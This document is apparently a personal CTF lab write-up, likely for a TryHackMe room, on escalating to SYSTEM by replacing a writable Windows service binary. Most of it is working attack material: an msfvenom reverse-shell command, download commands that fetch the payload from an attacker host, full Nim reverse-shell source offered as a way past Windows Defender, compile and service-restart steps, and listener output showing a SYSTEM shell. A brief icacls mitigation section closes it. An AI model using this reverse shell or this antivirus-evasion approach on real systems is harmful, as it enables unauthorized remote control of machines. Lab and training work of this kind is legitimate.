
If we have write access we can simply put a msfvenom .exe and get the reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.13.164 LPORT=4447 -f exe > msf.exe
```

create python server 

In windows 

```
Invoke-WebRequest -Uri http://10.17.13.164:8000/msf.exe -OutFile msf.exe
```

Using curl 

```
curl "http://10.17.13.164:8000/spoofer-scheduler.exe" -o spoofer-scheduler.exe
```


### Windows-Defender

If defender blocks msf.exe

Use nim shell 

```
#[ 
   Created by Sn1r
   https://github.com/Sn1r/
 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = "10.17.13.164"
  v2 = "4444"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  v.connect(v1, Port(parseInt(v2)))

  while true:
    v.send(os.getCurrentDir() & "> ")
    let c = v.recvLine()
    if c == "exit":
      v.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        v.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      v.send(r)

except:
  raise
finally:
  v.close
```


Command : 

```
nim c -d:mingw --app:gui -o:spoofer-scheduler.exe rev_shell.nim
```

```
nim c -d:mingw --app:gui rev_shell.nim
```

Put it to the server

Sop/Start the service

```
sc stop spoofer-scheduler
```
Then , Verify

```
sc query spoofer-scheduler
```

Using curl :

```
curl "http://10.17.13.164:8000/spoofer-scheduler.exe" -o spoofer-scheduler.exe
```


In linux: Start Listener

```
nc -lvnp 4444
```

Output 

```
┌──(n0rmh3ll㉿kali)-[~/tryhackme/hackSmart]
└─$ nc -lvp 4444
listening on [any] 4444 ...
10.201.98.122: inverse host lookup failed: Unknown host
connect to [10.17.13.164] from (UNKNOWN) [10.201.98.122] 50270
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> 
```

Done




### Mitigation :

 Remove file permissions:

```
icacls "C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe" /remove "BUILTIN\Users"

icacls "C:\Program Files (x86)\Spoofer" /remove "BUILTIN\Users"
```

Set proper permissions:

```
icacls "C:\Program Files (x86)\Spoofer" /grant "BUILTIN\Administrators:(F)"
icacls "C:\Program Files (x86)\Spoofer" /grant "NT SERVICE\TrustedInstaller:(F)"
icacls "C:\Program Files (x86)\Spoofer" /deny "BUILTIN\Users:(W,R,X)"
```


